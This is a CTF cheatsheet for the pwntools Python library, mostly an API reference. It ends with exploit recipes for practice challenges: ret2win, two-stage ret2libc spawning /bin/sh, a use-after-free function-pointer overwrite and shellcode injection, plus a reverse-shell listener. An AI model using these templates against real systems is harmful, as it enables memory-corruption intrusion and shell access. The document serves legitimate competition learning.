---
title: "pwnlib - CTF usage cheatsheet"
date: 2027-11-25 12:00:00 +0200
categories: [CTF, Cheatsheets]
tags: [pwn, pwntools, binary-exploitation, rop, ret2win, ret2libc, srop, cheatsheet]
---

> **Abstract — what this is**
>
> **pwnlib** is the Python package behind `import pwn` (aka pwntools).
>
> Below is a working cheatsheet with examples from real CTF scenarios: ret2win, ret2libc, UAF, format string, SROP. Everything here has been tested on real challenges.
>
> - 📖 [Docs](https://docs.pwntools.com/)
> - 🔗 [GitHub](https://github.com/Gallopsled/pwntools)

This is a collection/summary of other cheat sheat's (there aren't that many ones out there), spiced by me experience of participating in CTF`s.
Hopefully, i will maintain these - will be adding some niche(?) use cases, tips and tricks.
Shout out to these guys:
- [Xavierholt's cheat sheet](https://xavierholt.github.io/cheatsheets/pwntools.html)
- [anvbis's cheat sheet](https://gist.github.com/anvbis/64907e4f90974c4bdd930baeb705dedf)

## Basic Setup
 
The minimal template that opens **every** exploit and can be created `pwn template ./binary > exploit.py`
 
```python
#!/usr/bin/env python3
from pwn import *
 
BIN  = './binary'
HOST, PORT = 'chall.ctf.io', 1337
 
context.binary = elf = ELF(BIN)
context.log_level = 'info'
 
# local:  process(BIN)
# remote: remote(HOST, PORT)
io = process(BIN)
 
io.interactive()
```
 
> `context.binary = elf` - One line sets arch, bits, endian, os and makes `p64`/`u64` correct for the target binary.
 
## Connections
 
```python
# Local process
p = process('./chall')
p = process(['./chall', '--flag'], env={'LD_PRELOAD': './libc.so.6'})
p = process('./chall', aslr=False)          # disable ASLR locally
 
# Remote (TCP)
r = remote('chall.ctf.io', 1337)
 
# Remote with SSL
r = remote('chall.ctf.io', 1337, ssl=True)
 
# Remote via Unix socket
r = remote('unix', '/tmp/chall.sock')
 
# SSH → run binary on a remote host
s  = ssh(user='ctf', host='box.ctf.io', password='...')
sh = s.process('/challenges/vuln')
 
# Listener (for reverse shells)
l = listen(port=4444, bindaddr='0.0.0.0')
c = l.wait_for_connection()
 
# Context manager — closes automatically
with process('./chall') as p:
    p.sendline(b'hi')
```
 
## Send / Recv
 
| Method | What it does |
|---|---|
| `p.send(b'...')` | raw bytes |
| `p.sendline(b'...')` | bytes + `\n` |
| `p.sendafter(b'$ ', b'...')` | waits for `$ `, then sends without `\n` |
| `p.sendlineafter(b'> ', b'...')` | waits for `> `, then sends with `\n` |
| `p.recv(n=4096)` | up to n bytes |
| `p.recvline()` | up to and including `\n` |
| `p.recvuntil(b'> ')` | up to and including the delimiter |
| `p.recvall()` | until close |
| `p.recvrepeat(2)` | "recvall with timeout" — useful for shells |
| `p.clean(1)` | same, but returns bytes |
| `p.interactive()` | drop into an interactive session |
 
> **`recv` can block** — if the expected data never arrives, the process hangs. Always set `timeout=` or set `context.timeout = 3`.
 
> `sendlineafter` = `sendline` — it appends `\n`. For binary payloads use `sendafter`, otherwise the trailing `\n` corrupts the address.
 
## Context
 
```python
context(arch='amd64', os='linux', endian='little', log_level='debug')
context.clear(arch='amd64')                     # full reset
context.update(log_level='warn')                # partial update
 
# Temporary — reverts after the block
with context.local(log_level='error'):
    ...
```
 
| Field | Values |
|---|---|
| `arch` | `i386`, `amd64`, `arm`, `aarch64`, `mips`, … |
| `bits` | `32`, `64` |
| `endian` | `little`, `big` |
| `os` | `linux`, `freebsd`, `windows` |
| `log_level` | `debug`, `info`, `warn`, `error` |
| `timeout` | float, seconds |
| `terminal` | `tmux`, `x-terminal-emulator`, … |
| `binary` | `ELF(...)` — auto-fills all other fields |
 
## Logging
 
```python
log.debug('details for debugging')    # [DEBUG]
log.info('progress')                  # [*]
log.success(f'leak = {hex(x)}')       # [+]
log.warn('caution')                   # [!]
log.error('fail')                     # [ERROR] + raise PwnlibException
```
 
## Pack / Unpack / Utility
 
```python
p8(0x41)                        # b'A'
p16(0x4142)                     # little-endian
p32(0xdeadbeef)
p64(0x4142434445464748)
 
u8(b'A')                        # 0x41
u16(b'\x42\x41')
u32(b'\xef\xbe\xad\xde')
u64(b'\x48\x47\x46\x45\x44\x43\x42\x41')
 
# Big-endian / signed
p64(0xdeadbeef, endian='big')
p32(-1, sign=True)
 
# Arbitrary bit-length
pack(0x414243, 24)              # b'\x43\x42\x41'
unpack(b'\x41\x42\x43', 24)     # 0x434241
 
# Hex / b64 / hashes
enhex(b'/flag')                 # '2f666c6167'
unhex('2f666c6167')             # b'/flag'
b64e(b'/flag')
b64d('L2ZsYWc=')
md5sumhex(b'hello')
sha1sumhex(b'hello')
 
# Hexdump
print(hexdump(leaked_bytes))
```
 
## Cyclic Patterns
 
Finding the offset to saved RBP / RIP:
 
```bash
$ pwn cyclic 200 > /tmp/in
$ gdb ./chall
(gdb) run < /tmp/in
(gdb) info reg rip
rip   0x6161616c6161616b
```
 
```python
cyclic_find(0x6161616c6161616b)         # → 72
cyclic_find(p64(0x6161616c6161616b))    # same, with p64
cyclic(200)                             # the pattern itself
```
 
> ```python
> p = process('./chall')
> p.sendline(cyclic(200))
> p.wait()
> print(hex(p.corefile.rip), cyclic_find(p.corefile.rip))
> ```
 
## ELF & checksec
 
```python
elf = ELF('./binary')
 
hex(elf.address)                # base (0x400000 with No PIE)
hex(elf.symbols['win'])         # function address
hex(elf.plt['puts'])            # PLT
hex(elf.got['puts'])            # GOT
elf.sym                         # same as symbols, shorter
 
# Print checksec
print(elf.checksec())
 
# Rebase — all symbols become relative
elf.address = 0
libc = ELF('./libc.so.6')
libc.address = leaked - libc.sym['puts']
 
# Search bytes / strings
next(elf.search(b'/bin/sh\x00'))
 
# Patch and save
elf.asm(elf.sym.check, 'ret')   # NOP out a check
elf.save('/tmp/patched')
```
 
## ROP
 
```python
rop = ROP(elf)
 
# Simple gadgets
rop.rdi.address                 # pop rdi; ret
rop.rsi.address                 # pop rsi; ret
rop.rdx.address                 # pop rdx; ret
 
# Arbitrary gadget
pop_rax = rop.find_gadget(['pop rax', 'ret']).address
syscall = rop.find_gadget(['syscall', 'ret']).address
 
# Raw bytes
rop.raw(pop_rax)
rop.raw(59)
rop.raw(syscall)
 
# High-level call (auto-inserts pop gadgets)
rop.call(elf.plt['puts'], [elf.got['puts']])
rop.call(elf.sym.win, [0xdeadbeef])
 
# Ready-to-send payload
payload = rop.chain()
print(rop.dump())               # pretty-print the chain
```
 
## asm & shellcraft
 
```python
# Shellcraft
shellcode  = shellcraft.sh()
shellcode  = shellcraft.cat('/flag')
shellcode += shellcraft.exit(0)
 
# asm / disasm
blob = asm(shellcraft.sh())
print(disasm(blob))
 
# Raw syscall
chain = asm('''
    lea rdi, [rip+binsh]
    xor rsi, rsi
    xor rdx, rdx
    mov rax, SYS_execve
    syscall
binsh:
    .string "/bin/sh"
''')
 
# Wrap shellcode into an ELF for debugging
e = ELF.from_assembly(asm(shellcraft.sh()))
gdb.debug(e.path)
```
 
## Format String
 
```python
# Auto-detect the offset
def send(payload):
    p.sendline(payload)
    return p.recv()
 
fmt = FmtStr(execute_fmt=send)
print(fmt.offset)
 
# One-shot write
payload = fmtstr_payload(fmt.offset, {
    0x404060: 0xdeadbeef,       # where → what
    0x404068: 0xcafebabe,
})
p.sendline(payload)
 
# If N bytes were already printed before your payload
payload = fmtstr_payload(offset, writes, numbwritten=8)
```
 
## GDB Integration
 
```python
# Launch directly under GDB
p = gdb.debug('./chall', aslr=False,
              gdbscript='b *main+123\ncontinue')
 
# Attach to an already-running process
p = process('./chall')
gdb.attach(p, gdbscript='b *main+64')
p.sendline(payload)
 
# Attach to a remote gdbserver
gdb.attach(('127.0.0.1', 1234))
 
# Via SSH
s = ssh(host='box', user='ctf')
gdb.attach(s.process('/challenges/vuln'))
```
 
## Task Recipes
 
### Ret2Win (No PIE, No Canary, NX)
 
```python
elf = ELF('./chall')
OFFSET = 72
WIN    = elf.sym.win
POP_RDI = ROP(elf).rdi.address
RET     = ROP(elf).find_gadget(['ret']).address
 
payload  = b'A' * OFFSET
payload += p64(POP_RDI) + p64(0xdeadc0de)   # argument (if any)
payload += p64(RET)                         # align before win
payload += p64(WIN)
 
assert b'\n' not in payload                 # gets() truncates!
p.sendline(payload)
p.interactive()
```
 
### Ret2Libc (2-stage: leak + shell)
 
```python
elf  = ELF('./chall')
libc = ELF('./libc.so.6')
 
OFFSET  = 72
POP_RDI = 0x4011f3
POP_RSI = 0x4011f1
RET     = 0x401016
MAIN    = elf.sym.main
 
# Stage 1: leak puts@got → return to main
p1  = b'A' * OFFSET
p1 += p64(POP_RDI) + p64(elf.got.puts) + p64(elf.plt.puts)
p1 += p64(MAIN)
 
p.recvuntil(b'> ')
p.sendline(p1)
leak = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = leak - libc.sym.puts
log.success(f'libc @ {hex(libc.address)}')
 
# Stage 2: system('/bin/sh')
binsh = next(libc.search(b'/bin/sh'))
p2  = b'A' * OFFSET
p2 += p64(RET)                        # align for system()
p2 += p64(POP_RDI) + p64(binsh)
p2 += p64(libc.sym.system)
 
p.recvuntil(b'> ')
p.sendline(p2)
p.interactive()
```
 
### UAF → function pointer
 
```python
# 0. create
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b': ', b'A' * 8)
 
# 1-2. free / mark as favourite
p.sendlineafter(b'> ', b'2')
p.sendlineafter(b'> ', b'3')
 
# 3. reclaim the freed chunk with controlled content
p.sendlineafter(b'> ', b'4')
p.sendlineafter(b'length', b'40')
p.sendafter(b'bytes: ', b'A' * 32 + p64(elf.sym.win))
 
# 4. trigger — call through the function pointer
p.sendlineafter(b'> ', b'5')
print(p.recvline_contains(b'flag{').decode())
```
 
### Buffer overflow → sh (no PIE, no NX)
 
```python
payload  = asm(shellcraft.sh())
payload  = payload.ljust(72, b'A')
payload += p64(buf_addr)              # → shellcode
 
p.recvuntil(b'> ')
p.sendline(payload)
p.interactive()
```
 
## CLI
 
```bash
$ pwn checksec ./binary                # security flags
$ pwn cyclic 100                       # pattern
$ pwn cyclic -l 0x6161616b             # offset
$ pwn hex "hello"                      # 68656c6c6f
$ pwn unhex "68656c6c6f"
$ pwn asm "pop rdi; ret"               # → 5fc3
$ pwn disasm "5fc3"                    # → pop rdi ; ret
$ pwn shellcraft -l                    # list shellcraft functions
$ pwn shellcraft sh                    # ready-made asm
$ pwn template ./binary > exploit.py   # auto-generate exploit template
$ pwn elfdiff a b
$ pwn debug ./chall                    # gdb
```